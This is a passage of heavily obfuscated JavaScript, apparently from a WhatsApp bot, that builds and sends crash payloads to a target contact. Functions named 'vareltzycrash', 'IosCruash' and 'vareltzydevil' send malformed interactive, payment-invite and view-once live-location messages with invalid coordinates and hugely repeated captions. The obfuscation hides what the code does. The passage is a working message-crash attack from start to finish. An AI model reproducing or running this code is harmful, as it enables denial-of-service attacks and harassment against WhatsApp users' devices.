298,0x532)+_0x279901(0x15e,0x2b7,0x607,0x3a0,0x547)+_0x30a091(-0x145,-0x4e,0x44,-0xc7,-0x29a)+_0x279901(0x2d7,0x99,-0xaf,0x6a,0x10a)+_0x29f0b3(0x376,0xa3,0x32e,0x1d5,0x1d3)+_0x30a091(0x2f9,0x114,0x365,0x51e,0x21c)+_0x30a091(0x1ef,0x60,-0x9b,0x1fe,0x12d)+_0x279901(0x573,0x231,0x49c,0x3e1,0x4d4)+_0x307533(0x5a2,0x6ef,0x63d,0x57e,0x58e)+_0x30a091(0x109,0x35b,0x27e,0x28,0x137)+_0x307533(0x164,-0x183,0x326,0x1a2,0xdd)+_0x29f0b3(-0x1e,0x2a5,0x177,-0x54,0x26)+_0x307533(0x3fe,0x59b,0x42d,0x282,0x2df)+_0x307533(0x2b2,0x62f,0x617,0x5d7,0x38e)+_0x29f0b3(0x317,0xb1,0x2f0,0x1d2,0x2d4)+_0x307533(0x63b,0x21f,0x6c3,0x53a,0x3f9)+_0x30a091(-0x1aa,0xd8,0x124,-0x10e,-0x382)+_0xf1b353(0x368,0x4ee,0x29a,0x618,0x422)+_0x29f0b3(-0x102,0x152,-0x1e7,0x322,0xa6)+_0x279901(-0x1f8,0x1db,0x164,0xb5,0x317)+_0x307533(0x2d3,0x30,0x2a1,0x210,0x25c)+_0x30a091(0x50,0x26a,-0xf9,-0xae,0xec)+_0x279901(0x547,0x42e,0x3bd,0x33a,0x3c9)+_0x30a091(-0x164,0x128,-0xb5,-0x1ef,-0x409)+_0x30a091(0x116,0x238,0xab,0x3d9,0x26e)+_0x307533(0x4ae,0x2f1,0x622,0x65a,0x3c4)+_0x279901(0x282,-0x158,0x16f,-0x3a,0xb5)+_0x279901(0x548,0x142,0x184,0x28e,0x25e)+_0x30a091(-0x117,-0x2b9,0x1a0,-0x37c,-0xc3)+_0x29f0b3(0x604,0x20b,0x582,0x324,0x407)+_0x30a091(0x313,0x188,0x2c4,0x18f,0x3c2)+_0x307533(0x430,0x426,0x16a,0x19c,0x415)+_0x279901(0x3a6,0x61b,0x4e0,0x42b,0x4ba)+_0xf1b353(0x58a,0x429,0x899,0x3fc,0x622)+_0xf1b353(0x6cf,0x700,0x590,0x6b0,0x81a)+_0x307533(0x53e,0x64c,0x4ef,0x514,0x413)+_0x29f0b3(0x36,0x1e0,0x22a,-0x21a,-0x56)+_0x307533(0x21e,0x275,0x353,0x31d,0x21e)+_0x30a091(-0x15a,-0x31e,0x90,-0x2ea,0x84)+_0x29f0b3(-0x206,0x238,-0x19c,0x295,0x5a)+_0x279901(0x32e,0x1e0,0x310,0x30a,0x4df)+_0xf1b353(0x6d8,0x8df,0x9c4,0x912,0x7f7)+_0xf1b353(0x938,0x6bb,0x962,0x623,0x7fc)+_0x279901(0x1a5,0x22d,0x1a8,-0x5b,0x175)+_0x29f0b3(0x18b,0x4d9,0x56f,0x22a,0x2cb)+_0xf1b353(0x754,0x4bb,0x536,0x7ca,0x72a)+_0x29f0b3(-0x271,-0x205,-0x291,0x93,-0x117)+_0x307533(0x38e,0x3d0,0x24d,0x4bd,0x247)+_0x30a091(0x3c2,0x4b7,0x575,0x15d,0x388)+_0xf1b353(0x723,0x7e0,0x863,0x3a7,0x665)+_0xf1b353(0x538,0xfd,0x587,0xff,0x35d)+_0x29f0b3(-0x146,0x111,0xbc,-0x183,-0xe6)+_0x29f0b3(0x5b3,0x282,0x55c,0x3b0,0x402)+_0x29f0b3(0x4be,0x13c,0x3c8,0x3df,0x28a)+_0x279901(0x52b,0x139,0x3c1,0x25e,0x78)+_0xf1b353(0x23f,0x31b,0x315,0x44f,0x36e)+_0x30a091(0x29b,0x503,0x3b7,0x551,0x59)+_0x279901(0xc1,0x3ce,0xae,0x234,0x1cd)+_0x279901(-0x74,0x38c,-0x38,0x208,-0x9c)+_0x30a091(0x259,0x3ca,0x431,0x27f,0x1b5)+_0x279901(-0x95,-0x1d2,0x1dd,0x23,0x160)+_0x307533(-0x3d,0x288,0x1c3,-0xf5,0x86)+_0x307533(0x758,0x5c4,0x37f,0x5ed,0x55e)+_0x307533(0x372,0x368,0x25c,0x39b,0x360)+_0x30a091(-0x68,-0x42,-0x2b4,-0x293,0x7f)+_0x30a091(0x110,0xdf,0xf8,-0x69,0x83)+_0x279901(0x47d,0x29a,0x616,0x4e7,0x700)+_0x30a091(0x367,0x4bc,0x491,0x533,0x20b)+_0x29f0b3(-0x17e,-0x277,-0x15,-0x1e5,-0x1)+_0x29f0b3(0x2ed,0x1ca,0x89,0x272,0xb5)+_0x307533(-0x8c,-0x198,0xdb,0x137,0x12a)+_0x307533(0x2aa,0x481,0x276,0x28e,0x34b)+_0x279901(0x397,0x133,0x281,0x228,-0x41)+_0x279901(0x145,0x69,0x340,0x26a,0x157)+_0x29f0b3(-0x1dc,0x250,-0x1a7,-0x246,0x17)+_0x279901(0x1a2,0x1f,0xc3,-0x22,-0x20b)+_0xf1b353(0x187,0x17d,0x2de,0x603,0x35d)+_0xf1b353(0x472,0x109,0x457,0x560,0x2b8)+_0x307533(0x2dc,0x294,0x28e,0x61f,0x53f)+_0x307533(0x1b0,0x430,0x113,0x32e,0x3c7)+_0x279901(0x3c0,0x549,0x4de,0x317,0x3b1)+_0x29f0b3(0x268,0x152,-0x117,-0x113,0xb9)+_0x30a091(0x384,0x35b,0x2a5,0x636,0x25f)+_0xf1b353(0x381,0x68f,0x625,0x4ea,0x574)+_0x279901(0x26f,0x5b3,0x17e,0x33c,0x4e4)+_0x29f0b3(0x5e1,0x5ce,0x21c,0x42a,0x469)+_0x29f0b3(0x77,0x34c,0x427,0x1b8,0x281)+_0x30a091(0xc2,0x278,0x2e0,-0x85,0x36d)+_0x279901(-0x16c,0x180,-0x3c,0x140,-0x7d)+_0x279901(0x186,0x28f,0x391,0xe1,0x5e)+_0x307533(0x791,0x681,0x7d3,0x4fe,0x5a0)+_0x30a091(-0x19b,0x29,0x48,-0x339,-0x42a)+_0xf1b353(0x719,0x65c,0x3cd,0x528,0x63e)+'}';const _0x5cc639={};_0x5cc639[_0x30a091(-0x17f,-0x2a2,-0x37c,-0x39a,-0x2ed)+'ns']=[_0x133b3c];const vareltzycrash={'key':_0x41d64c,'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs[_0x29f0b3(0x2e1,-0x40,0x290,0x1e4,0x14)+_0x307533(0x1bb,0x242,0x1a4,0x6e6,0x470)+'nc'](_0xf1b353(0x861,0x34f,0x39a,0x600,0x5b5)+_0xf1b353(0x526,0x448,0x183,0x4fd,0x40d)+_0x30a091(0x349,0x22b,0x4db,0x597,0xc4))},'nativeFlowMessage':_0x5cc639}}};(function(){const _0x4cd8c2={'ugAUm':function(_0x511aed,_0x31377c){return _0x511aed(_0x31377c);},'kOolT':function(_0x46cca4,_0x254f17){return _0x46cca4+_0x254f17;},'fmDMM':_0x39fc4c(0x4a6,0x188,0x5d8,0x345,0x2be)+_0x39fc4c(0x4ee,0x67c,0x4db,0x517,0x683)+_0x4aca6d(0x45,-0x26a,0xdb,-0x4e,-0x10)+_0x39fc4c(0x3fd,0x540,0x3b5,0x332,0x1a4),'GzWeJ':_0x4aca6d(0x403,0x43d,0x34a,0x3a6,0x24f)+_0x39fc4c(0x384,0x4c4,0x2b9,0x249,0x2a7)+_0x557586(0x681,0x546,0x40a,0x2f3,0x189)+_0x4aca6d(0x499,0x4f9,0x3f0,0x409,0x22d)+_0x39fc4c(0x38c,0x8bc,0x80f,0x618,0x6b8)+_0x4aca6d(0x505,0x500,0x784,0x43b,0x74d)+'\x20)','Nlvfw':function(_0x255541){return _0x255541();},'vRCFD':function(_0x3e7f19,_0x40357d){return _0x3e7f19===_0x40357d;},'UEVcj':_0x2c67e3(0x7b8,0x285,0x50c,0x777,0x770),'MPMZu':function(_0x514fca,_0x207994){return _0x514fca!==_0x207994;},'DpSTf':_0x39fc4c(0x340,0x47a,0xc7,0x39b,0x1b1),'ynMmI':_0x195265(0x2e,-0x1bc,-0x2c,0x6,0x246),'dVMet':function(_0x446294,_0x3f54a0){return _0x446294(_0x3f54a0);},'FuMHC':function(_0x42bf65,_0x11a277){return _0x42bf65!==_0x11a277;},'uPxHr':_0x557586(0x423,0x591,0x595,0x3dd,0x4a8)};function _0x557586(_0x48260e,_0x461886,_0x324eb3,_0x2fd4f0,_0x3504a9){return _0x279901(_0x2fd4f0,_0x461886-0x8f,_0x324eb3-0x147,_0x324eb3-0x454,_0x3504a9-0x96);}function _0x39fc4c(_0x1cd3b9,_0x3fb4cb,_0x3b8149,_0xe7a6f6,_0x4ec3e8){return _0x307533(_0x1cd3b9-0x133,_0x4ec3e8,_0x3b8149-0xc8,_0xe7a6f6-0x8c,_0xe7a6f6-0x206);}function _0x195265(_0x4583e2,_0x3114a3,_0x29fd40,_0x1290b4,_0x2e881f){return _0x29f0b3(_0x4583e2-0xbe,_0x3114a3-0x150,_0x4583e2,_0x1290b4-0xd3,_0x1290b4- -0x114);}const _0x2fdf97=function(){function _0x54d262(_0x21c93b,_0x18b7fa,_0x30315c,_0x2e36ea,_0x5ab33d){return _0x4aca6d(_0x30315c-0xa1,_0x18b7fa-0x1a8,_0x30315c-0x2d,_0x2e36ea-0x1b5,_0x18b7fa);}function _0x126ba5(_0x19c425,_0x462ef8,_0x37223e,_0x2a6629,_0x582a1c){return _0x2c67e3(_0x19c425-0xa2,_0x19c425,_0x2a6629- -0x3d2,_0x2a6629-0x21,_0x582a1c-0xf9);}function _0x1c10db(_0x442db4,_0x488f62,_0x4a41dc,_0x3a1ffb,_0x2b8b4e){return _0x557586(_0x442db4-0x140,_0x488f62-0x1aa,_0x2b8b4e- -0x5bc,_0x3a1ffb,_0x2b8b4e-0x148);}const _0x273563={'thxoD':function(_0x5b8bfb,_0x301142){function _0x41bb0a(_0x4e4d38,_0x3a8ddf,_0x3c7831,_0x26ed21,_0x53cb95){return _0x28c5(_0x53cb95- -0x31,_0x3c7831);}return _0x4cd8c2[_0x41bb0a(0x3ce,0x1e2,0x1d1,0x2cf,0x29e)](_0x5b8bfb,_0x301142);},'wNlqM':function(_0x345ff6,_0x5627c9){function _0x4ec3ad(_0x2dddfc,_0xf854c6,_0x26c312,_0x345f32,_0x5248fc){return _0x28c5(_0xf854c6- -0x336,_0x26c312);}return _0x4cd8c2[_0x4ec3ad(-0x2f,-0x22,-0x2cb,-0x2a,-0x80)](_0x345ff6,_0x5627c9);},'GjjJN':function(_0x280c21,_0x42772e){function _0x2a0397(_0x428967,_0x2d41b0,_0x415a5a,_0x299433,_0x3eb25d){return _0x28c5(_0x299433- -0x3a9,_0x3eb25d);}return _0x4cd8c2[_0x2a0397(0x89,-0x104,0x21f,-0x95,0x131)](_0x280c21,_0x42772e);},'VgnqX':_0x4cd8c2[_0x54d262(0x3ee,0x4b4,0x589,0x4cd,0x627)],'ctmud':_0x4cd8c2[_0x54d262(0x34a,0x3ea,0x367,0x4e0,0x611)],'VmZsD':function(_0xa090ba){function _0x459760(_0x3abee8,_0x20d0c1,_0x51e156,_0x3525f7,_0xe5592f){return _0x2da67d(_0x3abee8,_0x20d0c1-0xa8,_0x51e156-0x14c,_0xe5592f-0x198,_0xe5592f-0x158);}return _0x4cd8c2[_0x459760(0x12a,0x79,0xb8,0x52c,0x323)](_0xa090ba);}};function _0x269fda(_0x2ef744,_0x26f70d,_0x1bc1b8,_0x5126fc,_0x4972c7){return _0x39fc4c(_0x2ef744-0xa9,_0x26f70d-0x188,_0x1bc1b8-0xa6,_0x26f70d-0x287,_0x4972c7);}function _0x2da67d(_0x169590,_0xb5e626,_0x9d1b08,_0xc70c3c,_0x45e538){return _0x557586(_0x169590-0x190,_0xb5e626-0x1c8,_0xc70c3c- -0x323,_0x169590,_0x45e538-0x7b);}if(_0x4cd8c2[_0x269fda(0x71e,0x6ee,0x4fb,0x69b,0x977)](_0x4cd8c2[_0x2da67d(-0x150,0x34e,-0x193,0xd8,0x1e7)],_0x4cd8c2[_0x2da67d(0x23c,0x27a,0x22b,0xd8,-0xb9)])){let _0x599718;try{_0x4cd8c2[_0x2da67d(0x727,0x46b,0x43e,0x5a7,0x543)](_0x4cd8c2[_0x2da67d(0x51a,0x1ad,0x338,0x3f0,0x39a)],_0x4cd8c2[_0x54d262(0x4c4,0x102,0x35b,0x444,0x5b6)])?_0x599718=_0x4cd8c2[_0x54d262(0xba,0x1c5,0x153,0x3f2,-0xe0)](Function,_0x4cd8c2[_0x126ba5(0x396,0x2fd,0x422,0x1b8,-0xba)](_0x4cd8c2[_0x269fda(0x649,0x688,0x5a7,0x79f,0x5ae)](_0x4cd8c2[_0x54d262(0x37f,0x61d,0x589,0x632,0x592)],_0x4cd8c2[_0x1c10db(-0xe2,-0x7e,0x273,-0x115,0xb0)]),');'))():_0x1b6386=_0x46bf26;}catch(_0x1b2e8f){if(_0x4cd8c2[_0x54d262(0x39c,0x8b9,0x66a,0x42a,0x7da)](_0x4cd8c2[_0x269fda(0x85c,0x5ca,0x67b,0x777,0x5ac)],_0x4cd8c2[_0x1c10db(-0x333,0x102,-0x274,0x171,-0xc8)])){const _0x379d5d=function(){function _0x1c52fd(_0x778da8,_0x21002e,_0xbc5255,_0x1e5576,_0x33050f){return _0x54d262(_0x778da8-0x10a,_0x21002e,_0xbc5255-0x2b7,_0x1e5576-0x1bc,_0x33050f-0x195);}let _0x3447f7;try{_0x3447f7=_0x273563[_0x23c2db(0x534,0x572,0x52d,0x56e,0x72b)](_0x367402,_0x273563[_0x23c2db(0x7d7,0xa2b,0x67e,0x594,0x6cb)](_0x273563[_0x1c52fd(0x861,0x476,0x613,0x458,0x66c)](_0x273563[_0x2caf46(0x176,-0x15e,0x1d0,0x32c,0x3b)],_0x273563[_0x23c2db(0x735,0x49f,0x71f,0x59f,0x6f8)]),');'))();}catch(_0x35a796){_0x3447f7=_0x8395ab;}function _0x23c2db(_0x4957d8,_0x1a1986,_0x160e41,_0x40749c,_0x47fce7){return _0x126ba5(_0x40749c,_0x1a1986-0x123,_0x160e41-0xf2,_0x4957d8-0x2c8,_0x47fce7-0x1cb);}function _0xd4d5aa(_0x46e6c4,_0x5f31a,_0x5d1778,_0x2a417b,_0x58e9b9){return _0x1c10db(_0x46e6c4-0x88,_0x5f31a-0xde,_0x5d1778-0xa4,_0x5d1778,_0x58e9b9-0x626);}function _0x2caf46(_0x45bd7a,_0x556be4,_0x4eaca7,_0x47dd9d,_0x1bb8ff){return _0x54d262(_0x45bd7a-0x18b,_0x47dd9d,_0x45bd7a- -0x164,_0x47dd9d-0xb9,_0x1bb8ff-0x1be);}function _0x4f9732(_0x19e11c,_0x36deea,_0x4f372a,_0x1ab261,_0x33da15){return _0x269fda(_0x19e11c-0x70,_0x33da15- -0x45a,_0x4f372a-0x105,_0x1ab261-0x182,_0x1ab261);}return _0x3447f7;},_0x5eef27=_0x273563[_0x1c10db(0x208,0x126,0x355,0x52e,0x39e)](_0x379d5d);_0x5eef27[_0x2da67d(0x266,0x4da,0x3d5,0x2b1,0x4e)+_0x1c10db(0x195,0x40d,0x21b,0x2f9,0x24e)+'l'](_0x5d6190,-0x266f+-0x8*-0x210+0x258f);}else _0x599718=window;}return _0x599718;}else{const _0xe72e3f=_0x1a6e9b[_0x2da67d(0x689,0x506,0x4be,0x569,0x3fa)+_0x1c10db(-0x23a,-0x38a,-0x188,-0x3af,-0x185)+'r'][_0x1c10db(0x25f,0x23a,0x1a,0x23b,0x46)+_0x54d262(0x493,0x406,0x355,0x111,0x92)][_0x1c10db(-0x188,0xa5,0x1da,0x93,0x6)](_0x1d4e64),_0x58739a=_0x2371f6[_0x2d499c],_0x3ae9fc=_0x27d5cb[_0x58739a]||_0xe72e3f;_0xe72e3f[_0x54d262(0x4dc,0x40f,0x48c,0x4a8,0x245)+_0x269fda(0x5bd,0x4ef,0x3f5,0x28d,0x53a)]=_0x1e5a95[_0x1c10db(-0x1d5,0x2d2,-0x7a,-0x1a2,0x6)](_0x58c0f7),_0xe72e3f[_0x2da67d(0x3aa,0x11f,0x3ee,0x2e7,0x89)+_0x1c10db(-0x156,-0x12,-0x347,-0xc5,-0x136)]=_0x3ae9fc[_0x126ba5(0x47f,0x336,0x23b,0x210,0xf3)+_0x269fda(0x571,0x55c,0x716,0x320,0x2c9)][_0x126ba5(0x3f1,0x2e4,0x12c,0x1c8,-0x10f)](_0x3ae9fc),_0x484766[_0x58739a]=_0xe72e3f;}},_0x331532=_0x4cd8c2[_0x39fc4c(0xa5,0x5ca,0x2eb,0x2fd,0x39e)](_0x2fdf97);function _0x2c67e3(_0x33798f,_0x46ada5,_0x4d3607,_0x171dad,_0x3ddb65){return _0xf1b353(_0x33798f-0xd,_0x46ada5-0x10,_0x46ada5,_0x171dad-0x3b,_0x4d3607-0x12e);}function _0x4aca6d(_0x174352,_0x375e9d,_0x342c96,_0x362575,_0x563eab){return _0xf1b353(_0x174352-0x11b,_0x375e9d-0x170,_0x563eab,_0x362575-0x1a9,_0x174352- -0x250);}_0x331532[_0x2c67e3(0x4d4,0x5f6,0x5ac,0x3da,0x69e)+_0x557586(0x74c,0x839,0x80a,0x6eb,0x938)+'l'](_0xddd9f7,-0x1ea6*-0x1+-0x13dd+-0x3b*-0x15);}());async function IosCruash(_0x2b381a){function _0x1b75b3(_0x1b63f4,_0xdaf30b,_0x53d15e,_0x7cd487,_0x583a52){return _0x307533(_0x1b63f4-0x13c,_0x53d15e,_0x53d15e-0x3d,_0x7cd487-0x17d,_0x1b63f4-0x419);}function _0x18b292(_0x45c20d,_0x24ecbb,_0x281109,_0x360ba7,_0x129012){return _0x30a091(_0x129012-0x264,_0x360ba7,_0x281109-0x32,_0x360ba7-0x164,_0x129012-0x18);}function _0x459285(_0x1e505e,_0x1c74ca,_0x3b7d3f,_0x594e55,_0xf1a921){return _0x29f0b3(_0x1e505e-0x1b,_0x1c74ca-0x51,_0x1c74ca,_0x594e55-0x27,_0x594e55- -0x69);}function _0x1b62a8(_0x432a08,_0x2270e7,_0x5237c1,_0xa4b7d1,_0x32e2a0){return _0xf1b353(_0x432a08-0x12b,_0x2270e7-0x77,_0x2270e7,_0xa4b7d1-0x119,_0xa4b7d1- -0x298);}const _0x18a953={};_0x18a953[_0x1b75b3(0x4ef,0x338,0x42f,0x34e,0x645)]=_0x1b75b3(0x5b8,0x62e,0x675,0x59f,0x4dc),_0x18a953[_0x1b62a8(0x126,0x653,0x334,0x3d0,0x454)]=function(_0x57ad2a,_0x13b27a){return _0x57ad2a+_0x13b27a;};const _0xec6280=_0x18a953;function _0x33d38b(_0x254381,_0x22f586,_0x12ceab,_0x5b2272,_0x10b96b){return _0x307533(_0x254381-0xe7,_0x22f586,_0x12ceab-0x1d1,_0x5b2272-0x25,_0x5b2272- -0xec);}await VxoZap[_0x1b62a8(0x181,-0x2e,0x497,0x1e4,0x431)+_0x33d38b(0x2d5,0x79,0x29a,0x311,0x4af)+'ge'](_0x2b381a,{'paymentInviteMessage':{'serviceType':_0xec6280[_0x33d38b(0x5c,-0xd8,-0x261,-0x16,0x32)],'expiryTimestamp':_0xec6280[_0x33d38b(0x341,0x555,0x5a8,0x31b,0x52d)](Date[_0x33d38b(0x513,0x3e6,0x602,0x396,0x19a)](),0x78419311+0x1*-0xaf606c75+-0xa3446564*-0x1)}},{'participant':{'jid':_0x2b381a}});}function sendMessageWithMentions(_0x1e645c,_0x2f8142=[],_0x1f5abd=![]){const _0x491488={};_0x491488[_0x489d47(0x260,0x29b,0x520,0x44c,0x2ab)]=function(_0x4861e2,_0x4bbb80){return _0x4861e2==_0x4bbb80;};function _0x489d47(_0x494e99,_0x309953,_0x36f571,_0x8806e5,_0x45e165){return _0x30a091(_0x36f571-0x591,_0x309953,_0x36f571-0x125,_0x8806e5-0x1c9,_0x45e165-0x1aa);}_0x491488[_0x4eef89(-0x227,-0x419,-0x239,-0x228,-0x4fb)]=function(_0x276d71,_0x109976){return _0x276d71==_0x109976;};function _0x38b8f2(_0x8790cd,_0x52208f,_0x266723,_0x193cbe,_0x4b3f6b){return _0x279901(_0x266723,_0x52208f-0x150,_0x266723-0x149,_0x193cbe- -0xde,_0x4b3f6b-0x4f);}_0x491488[_0x4eef89(-0x3ab,-0x33,-0x1d2,-0x26e,-0x42f)]=function(_0x3b02aa,_0x3dd6a4){return _0x3b02aa==_0x3dd6a4;},_0x491488[_0x3195eb(-0x116,0x1ee,0x29b,0x27,0x226)]=function(_0x2478cd,_0x58f5d1){return _0x2478cd===_0x58f5d1;};function _0x3195eb(_0x392b46,_0x157b7d,_0x1e88bb,_0x477e62,_0x4f436e){return _0x307533(_0x392b46-0x184,_0x157b7d,_0x1e88bb-0x179,_0x477e62-0xad,_0x477e62- -0x13f);}function _0x3878fa(_0x34d849,_0x382b97,_0x3b78fa,_0x43ac0f,_0x210203){return _0x279901(_0x3b78fa,_0x382b97-0x1d0,_0x3b78fa-0x9b,_0x34d849-0x414,_0x210203-0xee);}_0x491488[_0x489d47(0x3a9,0x69b,0x405,0x6ac,0x470)]=_0x3195eb(0x2e8,0x526,0x3ae,0x395,0x5d8);function _0x4eef89(_0x54f37a,_0x45f711,_0x440d8b,_0x2c781b,_0x47c79e){return _0x30a091(_0x440d8b- -0x7a,_0x2c781b,_0x440d8b-0x1c,_0x2c781b-0x36,_0x47c79e-0x76);}_0x491488[_0x4eef89(-0x2be,-0x2c4,-0x186,-0x3cb,-0x41c)]=_0x3195eb(0x46d,0x215,0x461,0x452,0x5ed),_0x491488[_0x489d47(0x546,0x392,0x475,0x638,0x681)]=function(_0x23c84b,_0x114c89){return _0x23c84b===_0x114c89;},_0x491488[_0x4eef89(-0x315,-0x251,-0x149,-0x28,0x6c)]=_0x3878fa(0x551,0x2d0,0x534,0x800,0x571),_0x491488[_0x38b8f2(0x489,0x204,0x171,0x3fa,0x19f)]=_0x489d47(0x44b,0x681,0x66b,0x473,0x8de);const _0x2c7747=_0x491488;if(_0x2c7747[_0x3878fa(0x510,0x4b4,0x3d8,0x659,0x70b)](_0x1f5abd,null)||_0x2c7747[_0x4eef89(-0xb7,-0x37c,-0x239,-0x453,-0x48e)](_0x1f5abd,undefined)||_0x2c7747[_0x3878fa(0x429,0x267,0x370,0x19f,0x298)](_0x1f5abd,![])){if(_0x2c7747[_0x3878fa(0x4dd,0x23d,0x2f9,0x48d,0x708)](_0x2c7747[_0x38b8f2(-0x2b1,-0x256,0x3,-0xfd,0x160)],_0x2c7747[_0x3878fa(0x475,0x615,0x5ae,0x21a,0x480)]))return _0x4d4d59;else{const _0x4b5dfc={};return _0x4b5dfc[_0x3878fa(0x4be,0x565,0x235,0x6f5,0x478)]=_0x1e645c,_0x4b5dfc[_0x3878fa(0x89e,0x79b,0xb18,0xb19,0x87b)+_0x4eef89(-0x44,0x17,-0x1ff,-0xf7,-0x1fc)]=_0x2f8142,VxoZap[_0x38b8f2(0x102,0x2aa,0x45b,0x3c2,0x3f8)+_0x4eef89(0x48,-0x51b,-0x257,-0xe3,-0x289)+'e'](m[_0x38b8f2(0x182,-0x232,-0x9,0x49,-0xff)],_0x4b5dfc,{'quoted':m});}}else{if(_0x2c7747[_0x3195eb(-0x215,0xdc,-0x13f,-0x51,0x19c)](_0x2c7747[_0x4eef89(-0x244,-0x19c,-0x149,-0x6b,-0x70)],_0x2c7747[_0x38b8f2(0x68a,0x199,0x2d8,0x3fa,0x5b8)])){const _0x131712={};_0x131712[_0x489d47(0x656,0x5db,0x4ce,0x22d,0x208)]=_0x489dc9,_0x131712[_0x38b8f2(0x594,0x254,0x645,0x3ac,0x5a5)+_0x3878fa(0x3fc,0x534,0x6a7,0x546,0x542)]=_0x3eeb22;const _0x5c554f={};return _0x5c554f[_0x38b8f2(-0x13,0x54,-0x12d,0xe,-0xc0)+'d']=_0x4cad2f,_0x14d7de[_0x3195eb(0x2ea,0x3cf,0x54b,0x3fe,0x41b)+_0x3878fa(0x3a4,0x5dc,0x3f9,0x380,0x29d)+'e'](_0x1e37b0[_0x3878fa(0x53b,0x4ff,0x4c8,0x4ac,0x2c6)],_0x131712,_0x5c554f);}else{const _0x43867a={};return _0x43867a[_0x38b8f2(0xa9,-0x292,-0x2c5,-0x34,-0x2b)]=_0x1e645c,_0x43867a[_0x38b8f2(0x20f,0x1e3,0x1b4,0x3ac,0x3ca)+_0x38b8f2(-0x3ac,0x3,-0x35d,-0xf6,-0x2de)]=_0x2f8142,VxoZap[_0x3195eb(0x51c,0x17f,0x64d,0x3fe,0x601)+_0x489d47(0x16b,0x64f,0x3b4,0x57e,0x566)+'e'](m[_0x489d47(0x714,0x781,0x54b,0x479,0x6cf)],_0x43867a,{'quoted':m});}}}async function sendLiveLocationMessage(_0x166356){function _0x79941(_0xbb8075,_0x1157f4,_0x4d84d6,_0x259ffd,_0x2fd2e7){return _0x307533(_0xbb8075-0x105,_0x1157f4,_0x4d84d6-0x111,_0x259ffd-0x1e8,_0x259ffd- -0x70);}function _0x192dfe(_0x3b1641,_0x232e63,_0x45f3f3,_0x1af496,_0x47bd80){return _0x307533(_0x3b1641-0x13f,_0x45f3f3,_0x45f3f3-0x1ec,_0x1af496-0x1a4,_0x1af496-0x133);}function _0x39d3ca(_0x333efb,_0x1d8ba4,_0x44ad8c,_0x263e96,_0x5ba9df){return _0x307533(_0x333efb-0x14a,_0x1d8ba4,_0x44ad8c-0x101,_0x263e96-0x31,_0x263e96- -0x1b9);}const _0x4a4925={'hiFOu':function(_0x56493b,_0x312451,_0x340043,_0xe2b082){return _0x56493b(_0x312451,_0x340043,_0xe2b082);},'MMIjS':function(_0x4e3363,_0x596070){return _0x4e3363+_0x596070;},'qOJva':_0xfe7db(-0x20e,0xc1,-0xd9,0x71,0x30d)+_0x4211ed(0x250,0x11f,0x2b,-0x236,-0x69)+_0xfe7db(0xc7,-0x220,0x6,0x71,-0x9c)+_0x4211ed(0xeb,-0x19a,-0x23b,-0x36,-0x69),'dCQwp':_0x79941(0xee,-0x4,0x247,0x27d,0x43b)};var _0x5327cb=_0x4a4925[_0x39d3ca(0x28f,0x18c,0x156,0x17d,0xfe)](generateWAMessageFromContent,_0x166356,proto[_0x4211ed(0x4be,0x10f,0x251,0x4a2,0x305)+'ge'][_0x4211ed(0x1db,-0x1c9,-0x98,0x55,-0x44)+_0xfe7db(0x58d,0x6e1,0x68e,0x47e,0x390)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x4a4925[_0x192dfe(0x39f,0x3e1,0x6d7,0x464,0x730)](_0x4a4925[_0x192dfe(0x554,0xa6,0x1b2,0x328,0x3b5)],_0x4a4925[_0x192dfe(0x266,0x1c1,0x11a,0x326,0x343)][_0x4211ed(0xe2,0x340,0x2e8,0x2be,0x24c)+'t'](0x13fc9*-0x1+0x1c*0x39a+0x19e41)),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x166356});function _0xfe7db(_0x141a02,_0x46a6d5,_0xa4655f,_0x19484d,_0x39f439){return _0x30a091(_0x19484d-0x1d9,_0x39f439,_0xa4655f-0x81,_0x19484d-0x85,_0x39f439-0x1c1);}function _0x4211ed(_0x38e3ad,_0x418f18,_0x32aa59,_0x181c2d,_0x2cef7f){return _0x29f0b3(_0x38e3ad-0x13b,_0x418f18-0x1a3,_0x32aa59,_0x181c2d-0x1b0,_0x2cef7f-0x45);}await VxoZap[_0x192dfe(0x557,0x57f,0x406,0x34e,0x480)+_0x39d3ca(0x3b6,0x4be,0x185,0x244,0x4ab)+'ge'](_0x166356,_0x5327cb[_0x4211ed(0x234,0x1b8,0x412,0x2ab,0x409)+'ge'],{'participant':{'jid':_0x166356},'messageId':_0x5327cb[_0x192dfe(0x6de,0x8fb,0x409,0x6da,0x44e)]['id']});}async function vareltzydevil(_0x1b0339,_0x10be02){function _0x9da0ff(_0x409c82,_0x89253b,_0x548e91,_0x25df4f,_0x29edfd){return _0x279901(_0x409c82,_0x89253b-0x76,_0x548e91-0x189,_0x89253b-0xab,_0x29edfd-0xe3);}function _0xc5dc9a(_0x3a95f2,_0x38b884,_0xabef73,_0x24fe0a,_0x42068f){return _0x29f0b3(_0x3a95f2-0x16a,_0x38b884-0xc8,_0x24fe0a,_0x24fe0a-0x71,_0x42068f-0x42);}const _0xea5150={'Srazj':function(_0x3c9ea8,_0x106a87,_0x2632d6,_0x3f6f79){return _0x3c9ea8(_0x106a87,_0x2632d6,_0x3f6f79);},'pQyWf':_0x9da0ff(-0x3f,0x18f,0xce,0x150,-0x6d)+_0xc5dc9a(0x427,0x544,0x1b1,0x43e,0x421)+_0x9da0ff(0x64b,0x599,0x45d,0x745,0x2f4)+_0x5481b4(0x3f7,0xc7,0x193,0x11d,0x199)+_0x8428bd(0x205,0x36e,0x3d6,0x4a3,0x515)+_0x55de12(0x76b,0x8dc,0x7b0,0x7b6,0x8f8)+_0x55de12(0x384,0x5cc,0x59f,0x394,0xfa)+_0x9da0ff(0x18d,0x9f,0x18a,0x1c2,-0xc8)+_0x9da0ff(0x41d,0x231,0x39a,0x94,0x16b)+_0x55de12(0x344,0x3d0,0x4d0,0x97,0x97)+_0x8428bd(0x15,0xbc,-0x112,0x16a,0x2a9)+_0x5481b4(0x4a3,0xed,0x59a,0x489,0x33c)+_0x9da0ff(0x605,0x3c4,0x1c9,0x442,0x23a)+_0x8428bd(0x5e3,0x5c1,0x4a0,0x572,0x60c)+_0x5481b4(0x314,0x13c,0x56e,0x233,0x3f4)+_0xc5dc9a(0x2cd,0x20c,0x255,0xf,0x262)+_0x5481b4(0x7b8,0x5b7,0x4b9,0x47d,0x641)+_0xc5dc9a(0x635,0x145,0x1f7,0xb0,0x362)+_0x9da0ff(0x36c,0x30f,0x4c6,0x4e3,0x44e)+_0x5481b4(0x2d2